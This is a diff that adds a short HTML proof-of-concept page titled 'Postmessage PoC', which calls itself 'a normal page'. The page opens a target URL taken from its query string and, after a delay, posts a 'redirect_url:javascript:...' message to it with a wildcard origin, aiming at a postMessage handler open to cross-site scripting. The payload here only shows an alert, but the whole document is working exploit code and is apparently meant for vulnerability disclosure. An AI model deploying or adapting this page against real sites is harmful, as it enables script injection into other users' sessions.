@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Postmessage PoC</title>
+  </head>
+  <body>
+    <h1>Hi this is a normal page !</h1>
+    <script>
+      window.onload = function () {
+
+        var qs = new URLSearchParams(location.search),
+        target=qs.get("target")
+
+        let win = window.open(target);
+        let msg = "redirect_url:javascript:alert(document.domain)"
+
+        setTimeout(function () {
+          win.postMessage(msg, "*");
+        }, 5000);
+      };
+    </script>
+  </body>
+</html>
